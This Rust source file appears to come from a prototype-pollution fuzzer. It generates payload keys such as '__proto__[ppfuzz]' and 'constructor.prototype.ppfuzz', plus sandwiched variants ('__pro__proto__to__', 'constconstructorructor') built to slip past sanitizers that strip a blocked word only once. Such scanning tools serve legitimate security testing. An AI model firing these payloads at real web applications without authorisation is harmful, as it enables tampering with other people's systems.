pub fn get() -> Vec<(String, String)> {
	[
		get_object(),
		get_pointer(),
		get_object_bypass(),
		get_pointer_bypass()
	].concat()
}

fn get_object() -> Vec<(String, String)> {
	const PREFIX: &str = "__proto__";
	let suffixes = [
		".ppfuzz",
		"[ppfuzz]"
	];

	suffixes
		.iter()
		.map(|suffix| (
			format!("{}{}", PREFIX, suffix),
			PREFIX.to_string()
		))
		.collect()
}

fn get_pointer() -> Vec<(String, String)> {
	const PREFIX: &str = "constructor";
	const ROOT: &str = "constructor[prototype]";
	let suffixes = [
		".prototype.ppfuzz",
		"[prototype][ppfuzz]"
	];

	suffixes
		.iter()
		.map(|suffix| (
			format!("{}{}", PREFIX, suffix),
			ROOT.to_string()
		))
		.collect()
}

// Bypasses key sanitizers that strip a blocklisted word (e.g. "__proto__")
// from a key only once and non-recursively, by sandwiching the blocklisted
// word between two halves of itself. Once the sanitizer strips the first
// (middle) match, the surrounding halves recombine into the original word.
//
// e.g. "__pro" + "__proto__" + "to__" -> "__pro__proto__to__"
//      stripping "__proto__" once leaves "__pro" + "to__" == "__proto__"
const PROTO_BYPASS: &str = "__pro__proto__to__";
const CONSTRUCTOR_BYPASS: &str = "constconstructorructor";
const PROTOTYPE_BYPASS: &str = "protoprototypetype";

fn get_object_bypass() -> Vec<(String, String)> {
	let suffixes = [
		".ppfuzz",
		"[ppfuzz]"
	];

	suffixes
		.iter()
		.map(|suffix| (
			format!("{}{}", PROTO_BYPASS, suffix),
			PROTO_BYPASS.to_string()
		))
		.collect()
}

fn get_pointer_bypass() -> Vec<(String, String)> {
	let root = format!("{}[{}]", CONSTRUCTOR_BYPASS, PROTOTYPE_BYPASS);
	let suffixes = [
		format!(".{}.ppfuzz", PROTOTYPE_BYPASS),
		format!("[{}][ppfuzz]", PROTOTYPE_BYPASS)
	];

	suffixes
		.iter()
		.map(|suffix| (
			format!("{}{}", CONSTRUCTOR_BYPASS, suffix),
			root.clone()
		))
		.collect()
}
